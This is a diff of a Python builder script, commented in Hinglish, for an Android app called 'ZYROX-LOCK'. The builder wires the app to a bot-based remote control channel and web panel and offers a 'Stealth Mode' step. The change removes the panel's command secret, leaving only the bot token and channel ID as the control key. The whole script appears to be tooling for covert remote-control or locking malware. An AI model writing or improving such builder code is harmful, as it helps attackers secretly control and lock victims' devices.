@@ -167,13 +167,12 @@ def main():
     else:
         print(f"{C['Y']}⚠ Pehle Step 5 me bot lagao — remote skip.{C['N']}")
 
-    # STEP 9: control channel + panel secret
+    # STEP 9: control channel (web panel) — v10: koi secret nahi, sirf channel
     print(f"\n{C['CY']}{C['B']}--- STEP 9: Control Channel (web panel) ---\n{C['N']}")
     ctrl_ch = ""
     if remote:
         ctrl_ch = input(f"{C['B']}📢 Control channel ID (-100... ya @name) [Enter = skip]: {C['N']}").strip()
-    alphabet = string.ascii_letters + string.digits
-    cmd_secret = "".join(random.choice(alphabet) for _ in range(10))
+    cmd_secret = ""  # v10: panel me secret nahi lagta
 
     # STEP 10: stealth mode
     print(f"\n{C['CY']}{C['B']}--- STEP 10: Stealth Mode ---\n{C['N']}")
@@ -321,10 +320,8 @@ def main():
     except Exception as e:
         print(f"{C['Y']}⚠ Folder copy nahi hua: {e} — APK yahin hai: {out}{C['N']}")
 
-    print(f"\n{C['Y']}{C['B']}╔══════════════════════════════════════╗{C['N']}")
-    print(f"{C['Y']}{C['B']}║  🔑 PANEL SECRET: {cmd_secret}          ║{C['N']}")
-    print(f"{C['Y']}{C['B']}╚══════════════════════════════════════╝{C['N']}")
-    print(f"{C['B']}   ⬆ Ye secret apne web panel me dalna — bina iske panel commands kaam nahi karenge!{C['N']}\n")
+    # v10: panel me koi secret nahi lagta — sirf token + channel ID dalo panel me
+    print(f"{C['G']}[✓]{C['N']} Web panel ready — sirf {C['B']}Bot Token + Channel ID{C['N']} dalo, koi secret nahi!\n")
 
     print(f"{C['Y']}{C['B']}--- LAST STEPS (app me hi honge) ---\n{C['N']}"
           f"📁 APK + panel is folder me hain: {C['B']}ZYROX-LOCK-{VERSION}/{C['N']}\n"
